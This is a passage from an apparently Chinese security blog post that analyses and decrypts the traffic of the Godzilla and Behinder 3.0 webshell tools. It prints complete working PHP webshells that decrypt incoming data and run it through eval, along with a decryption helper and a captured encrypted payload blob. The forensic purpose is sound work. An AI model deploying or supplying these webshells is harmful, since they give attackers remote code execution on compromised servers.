class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>即是PHP_XOR_BASE64的默认shell，至于后面key的编码和PHP_XOR_BASE64解密方法一致，可参考上面小节。</p>\n<h3 id=\"PHP-XOR-RAW\"><a href=\"#PHP-XOR-RAW\" class=\"headerlink\" title=\"PHP_XOR_RAW\"></a>PHP_XOR_RAW</h3><p>对应的默认木马文件：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">&lt;?php\n@session_start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@set_time_limit<span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@error_reporting<span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span>=0<span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span>&lt;strlen<span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> = <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span>1&amp;15<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span>^<span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$payloadName</span>=<span class=\"token string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span>=<span class=\"token string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span>=file_get_contents<span class=\"token punctuation\">(</span><span class=\"token string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token operator\">!</span>==false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$data</span>=encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>isset<span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$payload</span>=encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strpos<span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span>===false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$payload</span>=encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\t\teval<span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">echo</span> encode<span class=\"token punctuation\">(</span>@run<span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>strpos<span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!</span>==false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span>=encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里根据shell可以得到 解密过程更简单一点，但它需要提取二进制数据进行解密，直接用wireshark有点麻烦就在哥斯拉的shell里添了：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$b</span> = file_put_contents<span class=\"token punctuation\">(</span><span class=\"token string\">'raw.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>将二进制文本存了下来，然后直接读取解密：</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">&lt;?php \n@session_start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@set_time_limit<span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@error_reporting<span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> encode<span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span>=0<span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span>&lt;strlen<span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> = <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span>1&amp;15<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> = <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span>^<span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$pass</span>=<span class=\"token string\">'pass'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payloadName</span>=<span class=\"token string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span>=<span class=\"token string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n\n\n\n<span class=\"token variable\">$file_path</span> = <span class=\"token string\">\"raw.txt\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_exists<span class=\"token punctuation\">(</span><span class=\"token variable\">$file_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$fp</span> = fopen<span class=\"token punctuation\">(</span><span class=\"token variable\">$file_path</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$post</span> = fread<span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span> filesize<span class=\"token punctuation\">(</span><span class=\"token variable\">$file_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$post</span> = str_replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\r\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n<span class=\"token comment\">#$post = \"\";</span>\n\n\n<span class=\"token comment\">#echo base64_decode($post);</span>\n<span class=\"token function\">echo</span> <span class=\"token string\">\"&lt;br/&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">echo</span> <span class=\"token string\">\"&lt;br/&gt;\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">#$data=encode(base64_decode($post),$key);</span>\n<span class=\"token variable\">$data</span>=encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">echo</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"冰蝎3-0\"><a href=\"#冰蝎3-0\" class=\"headerlink\" title=\"冰蝎3.0\"></a>冰蝎3.0</h2><p>这里还是以php为例，默认shell如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a02439ec229d8be0\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//该密钥为连接密码32位md5值的前16位，默认连接密码POST</span>\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'k'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">extension_loaded</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'openssl'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$t</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"base64_\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"decode\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\n\t\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    \t\t\t <span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    \t\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">else</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token variable\">$post</span><span class=\"token operator\">=</span><span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"AES128\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$arr</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'|'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$params</span><span class=\"token operator\">=</span><span class=\"token variable\">$arr</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">C</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span>\n    @<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">C</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$params</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>由shell可得冰蝎所进行ase加密的恶意代码，这里解密需要密钥，而密钥是由设置连接密码32位md5加密的前16位组成，整体解法并不复杂。</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\">2L40NUw3Mv00wTIlVK7Jz4FY4xOvRXtym/xSmP20i+wHTDZpqs0PHF7j3BzBDhZlPVbkI8iaBWjGuwdmzA8CfTOxPkH547xm5v8GyO7utOD/HuDO/LVXdKL6swAu4sGlBtEaK8FDyETSfNYiYmcfkaQYGUMTt1jjFE0EYckfjMh+9muc7UGO8K5EIGcwF8LdtuNeH0QOv2nBEarF9R53r9X2JdWfBungKXiOGVbWdNEiUTG3NU5Mlem0r+Vvsvv19HQLTtNlBPB7M8tDE0LtSktjPgt5n50+rJe3bLKMnI/aaoHNe8bcfbiLSk13Fn5D8dXwkf8vN6OaVDVq+Dn3qaCORhOSX+36YvzAgmdWWYb7e0TAAHK9UTlifPZGyCzt7DFUipMIpeEdNqdfh4TN2TSy/Dua8FiIutMA5pI9zrkC/g/OAqK3C6PsfvQOQSkoYkA3uS0/GK+oMiIplS3VLtxqtKpgS3a4IC6yHn/dZnwPpf32lzuzGfRnhOIluqXqzvLyxJC7mKhMj0IjVjztm6XKbi2Nki2DAQVh36gdHCC6by4Ut/2err6VZDrIQUrWycdZzCCu2OD1FFAZzUOiQ+<span class=\"token operator\">+</span>PxUS2rOc5K+I2NnLgGePpj6VOmDbOibLrfrFG0nQOHXkpK4r+XKRypn21dDB7tg2N3Q8PXdmkygpGTic8dU98KA/hqog0uWoNOEVo6KbIScewGuTEvOlGiObfTPfZCW5n0oW6nonx8ljzVy1MU3MvcH6vkTNhpcUbuInyND8DMqdpi+MvfPlX0tuD9AE5G9F533u2ovGNCQroyFuFwNAu7ovUzpML1AsBaFTbdQKgo5d4YNdIBE6/kFW30b6WQMOg8cok2R+9mowbtp/4P77/ruY+mhp4Gba1cCINXeWv9rWQYr1tn2a34Pe09Z4g1vN8xjdyHE5PMs1mpAWog6eE1ZLiXSrHsT2Bj85BnZhVVlqMym6NMVm3uLCqiX0J6ul+zILAYQivDOzMxNpdCFojitJ5G3DSL5wk/U+xZoSz8mCrA2ovuaSvDknw+bBSORJv5xC8otDLV3g/5dBuAjDlOkbSD4MfL3MfdvIq6g0d807G9txdQk4/IyBtlz9HFu4LZ4bHB/3N8MmnDP1DZEfJ1zjakmHFMJMkntoda4xBsuz4C/QYykF3ctZ8azJPHmtG0ruvMPO1le1wqINkkZy2GsJDVxJV2n1Fb4NYdGxiydoU9so+NtGCPr3bbmj/AxlplfHLzzC9nJ4yOn3Su9YzYxrgpcvj6z7GPhM2b1UOWQPzNwDtgWMTXVrGtZ7JJscx00G3P7akErCmodWRyU+9Lch5FFvCxjc/48k2Dpja91Y5dqsVVJZ8FmHHN39oweIBiE6n21ShMhB4D+BW+jLK11GmlRCcrj0leZUh8pTPd0E6K/JFJMIozcolxXpa8hY8snvC9BiNdMg2ltrD0yj64eqvTMBWJqYY3oMckenhix/fUEX7jCMABsiUWDeYrf/ds4i1NWxcAnnARcTnVoqLIaSzd9CUTmUdQrfVJbZ2ghTqsY0qQ8dVteGcXyD8ehMf1ClgKDx0akUcVMzJfQRiX2X1Uv5RRuC64hGuRo2wMn0uKqZqMSU1Yf1KiDw5R/m0hZjB30+8Cr6d+RCxp2bPWvdXrPrJasCHhhqx7kHi/RPqjO0rpl/y01pK5MVe6AUBZoGcsFwzML911PdtdXAEjPaFZqAu829efqTMS9wDBO7F4n+l93rgsdEY0ejrq/R/jbhprzReX/8tvGRPAzSFd6OS+BKAZYZ3PcMGcGTp4v1/SnM/DVx1B6sOpztsQ65ZzDPWa+iudfxdhiKlY+smt2uJCC413enKyGwJ+X+PtkS1yBB0im+xNuCOrC7Qn72Q2TW/VjQmHaPpQVoLLJ5cIorBLnLxlk63dZsd4to5+xISEru4utDoART3MS+IRgxVe1af89yerrVdyO+<span class=\"token operator\">/</span>6IVNLz/N9alZ2i1LRnAiY5FovPB+IJjo0xNqqEiGCF3B2hEl9/C9XaXbk5lVi/JhGcA5r0CNgn4i6ROqL8fgrqbZ0h53hf9TAotoTV9B9NiufGDxn/slXDu1km6Oqd1YA/EKrKLTlNkd0GKvWBEnYEqx+82eJ8yTUTRWPyl63jh6kgNKHbqU+e840JF1bOMy5+JBuH9jhrSak8HVdU9j4ey3A6tldMKagq1s8swjcXmMsVB3LNoMJN90/k0TTRj9oM2VYLz1eknBKtxR8g3Nnrpo4KOrk2C1mrsFoPoptJgocyX9YQMUyrVx9qPRvjRggJnV2ANWO4mLze1rHGPAAMLG8Wof8sgNSp4UbOqd9aykJ87JUXtn1X3TT6WDmFZPrYWf7uzJ63AIfOKn9ZSs0DTfLOJGsHEqzWP2rWG1aH/CnEb0HBF6bov2qhwUSg6W77NhEuqYZ/X8pbfbDzRBU/IZTUidvIxQFLSOSp8bYB08ROeIhtFF9CDKb3mcwIbP/AL5bQ+PD1I5LZ/Nrmp5jXs3AI+WTn/SBjsaai9JayciOON4gOJtuXW5W/xDAWpT3qhOW0CmEX2/C0fyadgIVXDrNcQ8QCANuvMc3v1yUiDbijCPya14rx/5SoWqHsusPm9LbdNcTDBPkP/fE2Mvo81iQP0iQy7hIExPOb1gBSh2KcJsSeruRO65/PUx+<span class=\"token operator\">/</span>JLezWee4eRWwH/7uRzQY7q+mrYlBj0vCIckMiPp5CR9oeUs4gdlxhqL4ObV9y8F5dckigcm7RVs2gRU7HT4BHxtfuf6mRwO99ocrSvlcBz0aTDmVdQ7dQMSzfhgPhCqtSQSpeohbwFQYUYAKIJppOX7cxhXJmaZJA4ykzRZN/nimUCkUEZEBystBfve6ZXNSgQTR7jU14q9w+Fq4nG+11Q/EmdqWoZ615gZ0ANGAugixjJZ+9mHRlphfzyJo8c/d4U1nNkzx/D1Tk6WDarwdicqMEGlkxQC8swqvndAYAUTedIpKVnkRu+TBPoDvbBvb2XQgLV/LvcZXSqKbWQ0Lm0u7ZW5GwT4ZNIoPpaxrCMCe0TcpR8+OtJWhaiCk4RDG9eEiNENmZVCLDSjK1q19i4051UVVjWQtY+hh7tWkxAWu/eSTSQsbP9m5ddPF4yCltClHP040G5fGIB23sSrlHGQnLIFoXMURB6hMjKL0S8m4AAIDwyLvjdlQ/K4HjHA48tcAWFQMSus4oO4uFouP4kiQi19ucpjq7uilBWbe8ktWebTz8ZyHNi+MQjdpD2vSWh4SL7rALJFqXShjOCJPWlpTqa5Y08JdfxlyFldZhWyo6IoEwXMxj08QOEo+sIkOVmmwUbMuiZ88OWlflnHcbcO8mfMB0r0RNPs16F9fb4VV596GzMpKIqiHvrz8BI0PRPhcbDtpaeQyD8AHRHMHzLcf3g1V9Fwpt4EgIvnPd3qrn4BiYjcbm9+t8bDyP905zyX8HeRskCbv/De7DzeuiTa2WIj4ERKkG+P7zePkTScnYUWITcnG3Ui63rfsgM4pV1omtrIPmV2oGunCAFO1uTQHYu4Z9u64Gs/fBoRAO7oM+AnXywoNIjl8Hx3AivGnciwhuxJm1mCFHkdnNLjU7yGKkuX6UoX4+QKkUroX/gg04b9Z4Vzm2WsQMfGO5VAVRbEOj61FrQlyCM+oYSO2A9aL74BlM972BYqqlGb8nLLKyBPpGrfwsPDR2mTZdz1sRSsRI2ItXR7wZjikxHCsVKsxgJGCna9iHiW6DZ5aIuhbUIhrVUVh8ws42qi3FyInGGBXTZU2EmETOzBBuiWBe+5gSQVRJ6nRe2ZsVhQoZJzJ1K6p6rae2Kp4wRD15kEN02kZZztuQGW9Lo2mPieZqRGFxWHiDy+nDTM1up1lCrDM5aoTPWS7G2efBwEj3uWigrPoc/6uzsbnMZa/pInWnXa3xGUca8X1gf3Rp1djsTpkyAjFVAMih6nGvemcoJCEINvne/Aq/ecvW+rP9TBkr/rXIrnaJjNHPCeYNOjl/C+LV+3EGJ/nBwsvbbb0+LpAS0uUjU2lszk3uPb9dsm29w1ZZoiku56Ab4h4wON/XHZ2z7qbRV4g4ISEcNTJdtqj0+D1fEIt4wClabVTgjTSId+4qkkv/OafZKxm8TqMXGxRMDpMSZdP3E8XOmck+MO4VMkabinj3F+yYLWD4IU20tJNKQ08Idz5SQ/<span class=\"token operator\">/</span>E5YCofQYtSEzefMB0BSXxYxU57/Sz3noBaW2w12m74eFQr97nfwQX9JY/qudbrtwVZd1cJjAUEzd5wdb35T24t0AQGkvQAGCpZlIu0k33N6rNXOYXKeE8cDx+gnzwcGOOGxqvhrTPXP8NciPOKNv/5j0SMT0f4FBnNinaeRTX5IFseh4CO9OrO4xk8cI56o76BJFra8bUWqBEO83z37yD8cVk9XthxXYaHKmZur2AOuBpRBnmQqv36WvKRCReEfKiiYLGCrr1VJpEKrRWDESBvYxRU5IGM2hpcKqRo3+NwpwZsUdhIar6xQrEuWssOk41XuA1CyMpir8Re2LgaJIIRmk3N7mkvgr5/T8p8dFgZVdY1zOndkDOnQjGaKNJcmCYPt20+hXDo1dzVCPC3gDCtlbABSk2HNfwhOAGzrF+iInJCz1vOsFfM4ZyMz8v7b5E9S7559A11uAr4Z3crYz8fArkfnW7RV4w5JMSPVAltoecdujNYwsoL7+Qbb7X4EaYLpcrRLKrsUg7mXX7cc3GhAB4Wh7tqLFQw4CbMaKvmweImDdRelY3r5TjxCCROAfMTRGGiRhlopX7yw8CF+5c1cAR6PPJaMYSSztRRCok+cOkhD4pLeUEgRCuafwMQB350BfspEYONdr6Z7+hLgYNNEJa9cg4X7PKNB7OBwJ+<span class=\"token operator\">/</span><span class=\"token 